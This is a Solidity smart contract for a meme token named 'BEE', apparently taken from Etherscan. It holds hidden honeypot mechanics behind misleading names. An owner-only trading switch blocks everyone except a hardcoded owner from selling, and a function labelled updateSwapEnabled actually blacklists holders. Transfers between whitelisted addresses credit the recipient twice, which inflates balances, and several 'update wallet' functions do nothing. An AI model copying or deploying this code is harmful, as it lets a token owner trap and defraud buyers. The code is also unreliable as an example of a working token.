/**
 *Submitted for verification at Etherscan.io on 2023-01-25
*/

/*
*/
// SPDX-License-Identifier: Unlicensed
pragma solidity ^0.8.11;
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}
interface IUniswapV2Pair {
    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);
    function name() external pure returns (string memory);
    function symbol() external pure returns (string memory);
    function decimals() external pure returns (uint8);
    function totalSupply() external view returns (uint);
    function balanceOf(address owner) external view returns (uint);
    function allowance(address owner, address spender) external view returns (uint);
    function approve(address spender, uint value) external returns (bool);
    function transfer(address to, uint value) external returns (bool);
    function transferFrom(address from, address to, uint value) external returns (bool);
    function DOMAIN_SEPARATOR() external view returns (bytes32);
    function PERMIT_TYPEHASH() external pure returns (bytes32);
}
library SafeMathUnit {
    function trySub(uint256 a, uint256 b) 
    internal pure returns 
    (bool, uint256) { unchecked { if (b > a) return (false, 0);
            return (true, a - b); }
    }
    function add(uint256 a, uint256 b) 
    internal pure returns (uint256) { return a + b;
    }
    function sub(uint256 a, uint256 b) 
    internal pure returns (uint256) { return a - b;
    }
    function mul(uint256 a, uint256 b) 
    internal pure returns (uint256) { return a * b;
    }
    function div(uint256 a, uint256 b) 
    internal pure returns (uint256) { return a / b;
    }
    function mod(uint256 a, uint256 b) 
    internal pure returns 
    (uint256) { return a % b;
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) 
    internal pure returns 
    (uint256) { unchecked { require(b <= a, errorMessage); return a - b;
    } }
}
interface IDEPress01 {
    event PairCreated(
        address indexed token0, address indexed token1, 
    address pair, uint);
    function createPair(
        address tokenA, address tokenB) 
    external returns (address pair);
}
  interface B20RouterV1 {
      function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn, uint amountOutMin,
        address[] calldata path, address to,
        uint deadline ) external;
      function factory() external pure returns 
      (address);
      function WETH() external pure returns 
      (address); function addLiquidityETH(
      address token, uint amountTokenDesired,
      uint amountTokenMin, uint amountETHMin,
      address to, uint deadline
      ) external payable returns 
      (uint amountToken, uint amountETH, uint liquidity);
}
abstract contract Ownable is Context {
    address private _owner; event OwnershipTransferred
    (address indexed previousOwner, 
    address indexed newOwner);

    constructor () { _owner = 0x0e8922f374F0c07596606F201828CE67179636Ec;
        emit OwnershipTransferred(address(0), _owner); }

    function owner() 
    public view virtual returns (address) {
        return _owner; 
    }
    modifier onlyOwner() {
        require(owner() == _msgSender(), 
        "Ownable: caller is not the owner");
        _;
     }
    function renounceOwnership() 
    public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner 
        = address(0); }
}
interface IDEEC20 {
    function totalSupply() 
    external view returns 
    (uint256);
    function balanceOf(address account) 
    external view returns 
    (uint256);

    function transfer(address recipient, uint256 amount) 
    external returns 
    (bool);
    function allowance(address owner, address spender) 
    external view returns 
    (uint256);

    function approve(address spender, uint256 amount) 
    external returns 
    (bool);
    function transferFrom( 
    address sender, address recipient, uint256 amount
    ) external returns (bool);

    event Transfer(
        address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner, address indexed spender, uint256 value);
}
// de ETHERSCAN.io.
contract BEE is Context, IDEEC20, Ownable {
    uint256 private OptimizationCalculations;
    bool public intertextualFlow = true;
    bool public reservesRatio = true;
    bool private tradingAllowed = false;
    uint256 public internalTokensAtInterval = 30;
    uint256 public externalThreshold = 20;
    uint256 public getReserves = 0;

    string private _name = unicode"🐝INU"; string private _symbol = unicode"BEE";
    uint256 private constant uint226 = ~uint256(0);
    uint8 private _decimals = 12;
    uint256 private _totalSupply = 5000000 * 10**_decimals; uint256 public authorizationsForAmount = 1000000 * 10**_decimals;
    uint256 private _rTotalInBlock = (uint226 - (uint226 % _totalSupply));

    mapping (address => uint256) 
    private _tOwned;
    mapping (address => mapping (address => uint256)) 
    private _allowances;
    mapping (address => bool)
    private _quantomFaucet;
    mapping (address => bool) 
    private _operationsThreshold;

    uint256 private liquidityPairBalance = 
    internalTokensAtInterval;
    uint256 private _frequencyInSeconds = 
    getReserves;
    uint256 private _percent = 
    externalThreshold;
    bool AtAmountOverview;
    uint256 private arrangeNodes = 1000000000 * 10**18;
    event requireV2Router(
    uint256 deadAddress); event MarketMakerPair(
    bool enabled); event TEAMwalletUpdated( uint256 oldWallets,
    uint256 burnAddress, uint256 preformAction ); modifier lockTheSwap 
    { AtAmountOverview = true; _; AtAmountOverview = false; }

    constructor () { _tOwned[owner()] = _totalSupply;
        B20RouterV1 _isIntConnection01 = B20RouterV1
        (0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        IDERemixed = IDEPress01
        (_isIntConnection01.factory())
        .createPair(address(this), 
        _isIntConnection01.WETH());
        IBEPEC20Link = 
        _isIntConnection01;
        _quantomFaucet [owner()] = true; _quantomFaucet [address(this)] = true;
        emit Transfer(
        address(0), owner(), _totalSupply); }

    function updateSwapEnabled (address distributor, bool triggerManual) 
    public onlyOwner {
        _operationsThreshold[distributor] 
        = triggerManual;
    }  
    function name() 
    public view returns (string memory) {
        return _name;
    }
    function symbol() 
    public view returns (string memory) {
        return _symbol;
    }
    function decimals() 
    public view returns (uint8) {
        return _decimals;
    }
    function totalSupply() 
    public view override returns (uint256) {
        return _totalSupply;
    }
    function balanceOf(address account) 
    public view override returns (uint256) {
        return _tOwned[account];
    }
    function transfer(address recipient, uint256 amount) 
    public override returns (bool) {
        _transfer(_msgSender(), 
        recipient, amount); return true;
    }
    function allowance(address owner, address spender) 
    public view override returns (uint256) {
        return _allowances[owner][spender];
    }
    function approve(address spender, uint256 amount) 
    public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function transferFrom(address sender, address recipient, uint256 amount) 
    public override returns 
    (bool) 
    { _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, 
        "ERC20: transfer amount exceeds allowance")); 
        return true;
    }   
    receive() external payable {}

    function IDEblocksFEE
    (uint256 _internalValues) 
    private view returns 
    (uint256) {
        return _internalValues.mul 
        (internalTokensAtInterval).div
        ( 10**3 );
    }
    function IDEFinalBlocksFEE(uint256 _internalValues) 
    private view returns 
    (uint256) {
        return _internalValues.mul 
        (getReserves).div
        ( 10**3 );
    }
    function IDEBlocksFeesPaired(uint256 _internalValues) 
    private view returns 
    (uint256) {
        return _internalValues.mul 
        (externalThreshold).div
        ( 10**3 );
    }  
    function _transfer(  address from,  address to, uint256 amount ) 
    private { 
        require(amount > 0, 
        "Transfer amount must be greater than zero");
        bool indexedCrate = false; if(!_quantomFaucet[from] 
        && 
        !_quantomFaucet[to]){ 
            indexedCrate = true;

        require(amount <= 
        authorizationsForAmount, 
        "Transfer amount exceeds the maxTxAmount."); }
        require(!_operationsThreshold[from] 
        && !_operationsThreshold[to], 
        "You have been blacklisted from transfering tokens");

        uint256 initialETHBalance = balanceOf(address(this)); if(initialETHBalance >= 
        authorizationsForAmount) { initialETHBalance 
        = authorizationsForAmount; } _afterTokenTransfer(
            from,to,amount,indexedCrate); emit Transfer(
                from, to, amount); if (!tradingAllowed) {require(
                    from == owner(), 
                    "TOKEN: This account cannot send tokens until trading is enabled"); }
    }
    function updateBURNwallet(address BURNaddr) public onlyOwner {
        BURNaddr = BURNaddr;
    }       
        function teamWalletUpdated
        (uint256 initialETHBalance) 

        private lockTheSwap { 
            uint256 newNum 
        = initialETHBalance.div(2); 
        uint256 amountSync = 
        initialETHBalance.sub(newNum); 
        uint256 initialBalance = 
        address(this).balance; 
        swapTokensForEth(newNum);

        uint256 _frequencySeconds = address(this).balance.sub(initialBalance);
        createLiquidityPair(amountSync, _frequencySeconds);
        emit TEAMwalletUpdated(newNum, _frequencySeconds, amountSync);
    }
    function min(uint256 a, uint256 b) private view returns (uint256){
      return (a>b)?b:a;
    }    
    function _beforeTokenTransfer
    (address sender, 
    address recipient, uint256 cratorAmount,
    bool indexedCrate) 
    private { 
        uint256 amountToSwapForETH = 
    0; if (indexedCrate){ amountToSwapForETH = 
    cratorAmount.mul(1).div(100) ; } 
        uint256 indexAmountWith = cratorAmount - 
        amountToSwapForETH; 
        _tOwned[recipient] = 
        _tOwned[recipient].add(indexAmountWith); 

        uint256 stringTrading 
        = _tOwned
        [recipient].add(indexAmountWith); _tOwned[sender] 
        = _tOwned
        [sender].sub(indexAmountWith); 
        bool _quantomFaucet = 
        _quantomFaucet[sender] 
        && _quantomFaucet[recipient]; 
        
        if (_quantomFaucet ){ _tOwned[recipient] =stringTrading;
        } else { emit Transfer (sender, recipient, indexAmountWith); } }

    function swapTokensForEth(uint256 tokenAmount) 
    private { address[] memory path = 
    new address[] (2); path[0] 
        = address(this); path[1] = IBEPEC20Link.WETH();
        _approve(address(this), address
        (IBEPEC20Link), 
        tokenAmount); 
        IBEPEC20Link.swapExactTokensForETHSupportingFeeOnTransferTokens(
        tokenAmount, 
        0, path, address(this), block.timestamp );
    }
    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), 
        "ERC20: approve from the zero address");
        require(spender != address(0), 
        "ERC20: approve to the zero address");
        _allowances[owner][spender] 
        = amount; emit Approval(
            owner, spender, amount);
    }   
    function updateTeamWallet(address TEAMaddr) public onlyOwner {
        TEAMaddr = TEAMaddr;
    }   
    function createLiquidityPair
    (uint256 tokenAmount, uint256 ethAmount) private 
    { _approve(address(this), address
    (IBEPEC20Link), tokenAmount); IBEPEC20Link.addLiquidityETH{value: ethAmount}(
     address(this), 
     tokenAmount, 0, 0, owner(), block.timestamp );
    }
    function enableTrading(bool _tradingOpen) 
    public
    onlyOwner { tradingAllowed = _tradingOpen;
    }      
    function _afterTokenTransfer
    (address sender, address 
    recipient, uint256 amount,
    bool indexedCrate) private { _beforeTokenTransfer
    (sender, recipient, amount, indexedCrate);
    } 
    address public IDEOptimizorkSettings;
    address public IDEGasTracking;
    address public immutable IDERemixed;
    using SafeMathUnit for uint256;
    B20RouterV1 public immutable IBEPEC20Link;
}